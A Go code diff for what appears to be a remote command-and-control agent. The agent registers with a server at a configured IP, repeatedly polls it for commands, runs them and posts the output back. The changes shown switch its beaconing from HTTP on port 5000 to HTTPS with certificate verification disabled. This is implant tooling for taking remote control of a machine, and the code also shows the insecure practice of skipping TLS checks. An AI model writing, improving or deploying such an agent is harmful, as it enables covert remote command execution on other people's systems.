@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"crypto/tls"
 	"encoding/json"
 	"fmt"
 	"io/ioutil"
@@ -43,10 +44,11 @@ func register(serverIP string) string {
 	}
 	postBody, _ := json.Marshal(host_info)
 	responseBody := bytes.NewBuffer(postBody)
-	fmt.Printf("%s", serverIP)
-	resp_register, _ := http.Post("http://"+serverIP+":5000/api/1.1/add_agent", "application/json", responseBody)
+	//fmt.Printf("%s", serverIP)
+	//resp_register, _ := http.NewRequest(http.MethodGet, "http://"+serverIP+":5000/api/1.1/add_agent", responseBody)
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	resp_register, _ := http.Post("https://"+serverIP+"/api/1.1/add_agent", "application/json", responseBody)
 	body2, _ := ioutil.ReadAll(resp_register.Body)
-	fmt.Printf("%s", body2)
 	agent_id := string(body2)
 	return agent_id
 }
@@ -56,7 +58,8 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 		"id": agent_id,
 	})
 	postBody := bytes.NewBuffer(post_body)
-	resp_query, _ := http.Post("http://"+serverIP+":5000/api/1.1/get_command", "application/json", postBody)
+	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
+	resp_query, _ := http.Post("https://"+serverIP+"/api/1.1/get_command", "application/json", postBody)
 	resp, _ := ioutil.ReadAll(resp_query.Body)
 	out := string(resp)
 	tokens := strings.Split(out, ",")
@@ -64,6 +67,7 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 	if command == "None" {
 		time.Sleep(sleepTime * time.Second)
 	} else {
+		fmt.Println("Received command")
 		commandID := tokens[1]
 		args := strings.Split(command, " ")
 		parsed_command := args[0]
@@ -76,15 +80,13 @@ func get_command(agent_id string, serverIP string, sleepTime time.Duration) {
 			"output":    output,
 		})
 		responseBody := bytes.NewBuffer(resp_body)
-		resp_send_command, _ := http.Post("http://"+serverIP+":5000/api/1.1/command_out", "application/json", responseBody)
-		ack_resp, _ := ioutil.ReadAll(resp_send_command.Body)
-		ack := string(ack_resp)
-		fmt.Printf("%s\n", ack)
+		http.Post("https://"+serverIP+"/api/1.1/command_out", "application/json", responseBody)
 	}
 }
 
 func main() {
 	agent_id := register(IP)
+	fmt.Printf("Agent ID: %s\n", agent_id)
 	time_int, _ := strconv.Atoi(SleepTime)
 	time_dur := time.Duration(time_int)
 	for {
